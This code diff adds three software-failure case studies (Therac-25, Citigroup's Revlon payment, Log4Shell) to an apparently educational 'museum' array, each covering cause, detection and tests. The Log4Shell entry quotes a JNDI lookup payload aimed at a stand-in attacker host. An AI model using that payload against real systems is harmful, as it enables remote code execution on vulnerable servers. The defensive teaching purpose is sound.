@@ -53,6 +53,36 @@ const museumExhibits = [
     rootCause: "Synchronous blocking dependencies, lack of caching, and unindexed database queries under concurrent transaction volume.",
     howToDetect: "End-to-end distributed load testing (e.g. JMeter/k6) modeling peak concurrent user funnels and measuring database lock contention.",
     testToCatch: "JMeter peak load test simulating 50,000 concurrent user registrations measuring p99 API latencies and verifying zero deadlock exceptions."
+  },
+  {
+    id: "therac-25-1985",
+    title: "Therac-25: The Race Condition That Killed",
+    category: "Race Condition & Concurrency",
+    whatHappened: "Between 1985 and 1987, the Therac-25 radiation therapy machine delivered massive overdoses of radiation to at least six patients, several fatally. A race condition let a skilled operator switch the machine from its low-power X-ray setup to high-power electron-beam mode by editing treatment parameters and pressing 'Enter' fast enough — a window of roughly 8 seconds — while the beam-flattening attenuator was still out of position, exposing patients to a beam up to 100 times the intended dose.",
+    whyMissed: "The race condition only manifested for fast, experienced data-entry operators — testers and QA staff typed more slowly and never landed inside the timing window. Earlier models had a hardware interlock as a backup; Therac-25 removed it and relied on software alone.",
+    rootCause: "A shared, unsynchronized flag variable was read by one concurrent task (the treatment monitor) while another (the keyboard handler) could still be modifying machine state — a classic time-of-check-to-time-of-use race condition, with no hardware safety net behind it.",
+    howToDetect: "Concurrency/race-condition testing that varies input timing (not just input values), mandatory hardware interlocks as defense-in-depth, and code review specifically for shared mutable state accessed without locking.",
+    testToCatch: "An automated UI-fuzzing test that rapidly edits and re-edits treatment-mode parameters within the known race window, asserting the beam physically cannot fire unless the hardware confirms correct attenuator position — not just that the software believes it does."
+  },
+  {
+    id: "citigroup-revlon-2020",
+    title: "Citigroup's $900 Million Fat-Finger Payment",
+    category: "UI Workflow & Confirmation Design",
+    whatHappened: "In August 2020, Citibank — acting as administrative agent on a Revlon syndicated loan — intended to pay lenders only the interest due (about $7.8 million). Instead, its loan-processing system sent the full outstanding principal: roughly $900 million. Some lenders returned the funds; others refused, triggering a major lawsuit that took years to resolve.",
+    whyMissed: "The internal system required staff to manually mark specific fields so a payment stayed 'washed' internally rather than actually leaving the bank — a routine interest payment required deliberately working around an interface built for a different transaction shape. Three separate reviewers were required to sign off, and all three missed the same misconfigured field.",
+    rootCause: "A confusing, error-prone manual workflow for a routine operation, with no clear, unambiguous confirmation screen summarizing 'this exact amount will be sent to this exact recipient' before an irreversible, high-value transfer.",
+    howToDetect: "UI/UX testing of confirmation flows on irreversible high-value actions, specifically checking whether the system surfaces a clear plain-language summary before submission — not just whether the underlying checkboxes were technically set correctly.",
+    testToCatch: "An E2E test that runs a routine interest-only payment through the exact production workflow (including any internal-offset/wash steps) and asserts zero principal is disbursed externally unless a dedicated, unambiguous principal-payment confirmation was explicitly completed."
+  },
+  {
+    id: "log4shell-2021",
+    title: "Log4Shell: When a Logging Library Became an RCE",
+    category: "Injection & Untrusted Input",
+    whatHappened: "In December 2021, a critical vulnerability (CVE-2021-44228) was disclosed in Apache Log4j, one of the most widely used Java logging libraries. Log4j would evaluate special lookup strings like `${jndi:ldap://attacker.com/a}` found anywhere in logged input — an HTTP header, a username, a chat message — and could be tricked into loading and executing attacker-controlled code. Because Log4j sat transitively inside an enormous number of Java applications, this became one of the most widespread, severe vulnerabilities in software history, forcing emergency patching industry-wide within days.",
+    whyMissed: "Logging was treated as a low-risk utility that 'just writes text,' so it never received the same input-sanitization scrutiny applied to obviously user-facing fields. A powerful, rarely-used feature — JNDI lookups inside log messages — had shipped enabled by default for years before anyone recognized the security implication.",
+    rootCause: "Untrusted, attacker-controlled input was passed into a context that interpreted and executed part of it, rather than treating it as inert text — the same category of failure as SQL injection, just in a place (a logging call) nobody thought to threat-model.",
+    howToDetect: "Software composition analysis (SCA) scanning for known-vulnerable dependency versions, fuzzing every sink that logs user-controlled input with injection-style payloads, and secure-by-default review of any feature that interprets strings as executable lookups.",
+    testToCatch: "An automated security regression test that submits a JNDI-lookup-style payload through every user-controlled input reaching a log statement, asserting the string is logged literally and no outbound network lookup ever occurs."
   }
 ];
 
